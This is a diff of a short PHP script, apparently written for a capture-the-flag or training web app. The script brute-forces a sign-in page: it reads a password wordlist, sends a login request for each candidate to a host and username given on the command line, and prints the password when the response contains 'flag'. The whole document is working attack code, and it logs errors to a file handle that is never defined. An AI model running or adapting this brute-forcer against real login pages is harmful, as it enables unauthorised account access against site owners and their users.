@@ -10,23 +10,25 @@ function grep($linet, $str) {
     return -1;
 }
 
-$a = $homepage = file_get_contents($argv[2]);
-$e =  explode("\n",$a);
-foreach ($e as &$b) {
-	$url = "http://$argv[1]/?page=signin&username=dsds&password=$b&Login=Login#";
-	$ch = curl_init($url);
-	curl_setopt($ch, CURLOPT_POST, 1);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	$z = curl_exec($ch);
-	$ee = $currentprofile=grep($z, "flag");
-	if ($ee != -1) {
-		echo $ee;
-		echo $b;
-		return;
+function brutus($login, $file, $ip) {
+	$a = $homepage = file_get_contents($file);
+	$e =  explode("\n",$a);
+	foreach ($e as &$b) {
+		$url = "http://$ip/?page=signin&username=$login&password=$b&Login=Login#";
+		$ch = curl_init($url);
+		curl_setopt($ch, CURLOPT_POST, 1);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		$z = curl_exec($ch);
+		$ee = $currentprofile=grep($z, "flag");
+		if(curl_error($ch))
+		    fwrite($fp, curl_error($ch));
+		curl_close($ch);
+		if ($ee != -1) {
+			echo "flag=$ee\npassword=$b\nurl=$url";
+			return;
+		}
 	}
-	if(curl_error($ch)) {
-	    fwrite($fp, curl_error($ch));
-	}
-	curl_close($ch);
-
 }
+brutus($argv[3], $argv[2], $argv[1]);
+
+?>
